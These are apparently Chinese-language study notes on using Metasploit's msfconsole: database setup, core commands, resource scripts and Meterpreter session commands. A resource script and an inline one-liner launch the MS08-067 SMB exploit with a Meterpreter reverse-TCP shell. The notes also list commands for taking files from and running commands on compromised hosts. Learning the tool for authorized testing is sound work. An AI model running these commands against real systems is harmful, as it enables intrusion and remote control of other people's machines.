# Metasploit

使用 Metasploit 兩個主流介面： ``Armitage``(GUI) 以及 ``MSFconsole``(command line)

  > P.S: 第三個主流介面 msfcli 在 2015 年 deprecated

## 透過 msfconsole 使用 Metasploit

1. 管理 Metasploit 資料庫
1. 管理 Session
1. 配置、啟動 Metasploit framework


啟動前必須先連上資料庫，可透過 ``ps -aux`` 來確認

```shell
service postgresql start
msfdb init
```

啟動 msf concole

```shell
msfconsole
```

在 msfconsole 中先確認是否成功連上資料庫

```shell
db_status
```

常用指令分為兩大類： `Core command` 以及 ``db backend command``

Core command:

```sh
> help # 指令幫助訊息，查看所有指令
> use [module] # 加載指定模組
> set [option] [value]
  # 在加載 module 的情形下，為 module 配置不同選項
  # 沒有 option 與 value 則會顯示已經配置的訊息資料
  # set payload [path-to-payload] 指定加載 payload
  # set RHOST 192.168.0.43 指定 Remote Host IP 位址

> options
  # 列出現在可以配置的選項，在 module 裡面的第一步就是看 options 說明書。
  # 如果不在任何模組之下，則會顯示 Global options
> run # 啟動攻擊模組, alias to exploit
> exploit # 啟動攻擊模組
> search [module] # 搜尋特定模組
> show # Global context 將顯示所有模組訊息
  > show auxiliary #秀出所有 auxiliary 模組
    # auxiliary 包含 scanners, DoS modules, fuzzers, and more...
  > show exploits # 秀出所有攻擊模組
  > show options
  > show payloads
  > show advanced # 進階 fine-tune 模組設定
  > show targets # 秀出該模組適合攻擊的 OS
> exit # 退出 msfconsole
```


```sh
  msf> search linux
```


## 將指令寫成腳本 .rc 透過 msfconsole 一次執行

直接鍵入 ``msfconsole`` 會進入 interactive 模式，你也可以先將指令寫成 ``resource script`` 後直接透過 msfconsole 執行。

```sh
  $ msfconsole --help # 秀出 command options

  ##############################
    Database options
      -M, --migration-path DIRECTORY   Specify a directory containing additional DB migrations
      -n, --no-database                Disable database support
      -y, --yaml PATH                  Specify a YAML file containing database settings

    Framework options
        -c FILE                          Load the specified configuration file
        -v, --version                    Show version

    Module options
            --defer-module-loads         Defer module loading unless explicitly asked.
        -m, --module-path DIRECTORY      An additional module path


    Console options:
        -a, --ask                        Ask before exiting Metasploit or accept 'exit -y'
        -L, --real-readline              Use the system Readline library instead of RbReadline
        -o, --output FILE                Output to the specified file
        -p, --plugin PLUGIN              Load a plugin on startup
        -q, --quiet                      Do not print the banner on startup
        -r, --resource FILE              Execute the specified resource file (- for stdin)
        -x, --execute-command COMMAND    Execute the specified string as console commands (use ; for multiples)
        -h, --help                       Show this message
  ##############################
```

先將指令寫成 ``temp.rc``：

```rc
  use exploit/windows/smb/ms08_067_netapi
  set RHOST [IP]
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST [IP]
  run
```

然後透過 ``-r`` 執行：

```sh
  msfconsole -r temp.rc
```

以上行為可透過 ``-x`` 一次 inline 寫完，等價為：

```sh
  msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST [IP]; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST [IP]; run"
```

或是已經在 ``msfconsole`` 裡面時透過指令 **resource**:

```sh
  msf> resource temp.rc
```


## 控制 Meterpreter

Meterpreter 就是一個 payload, 在漏洞利用後必須執行的一支程式，讓你可以跟受害主機之間有一個溝通的管道來傳遞訊息，並做所有操作。

* help：查看帮助信息。
* background：允许用户在后台Meterpreter会话。
* download：允许用户从入侵主机上下载文件。
* upload：允许用户上传文件到入侵主机。
* execute：允许用户在入侵主机上执行命令。
* shell：允许用户在入侵主机上（仅是Windows主机）运行Windows shell命令。
* session -i：允许用户切换会话。

透過 ``show payloads`` 用來顯示所有可以使用的 payloads





## Reference

* [Metasploit Fundamentals](https://www.offensive-security.com/metasploit-unleashed/using-databases/)

* [Metasploit for Beginners](MetaSploit tutorial for beginners)

* [msfconsole core command](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)
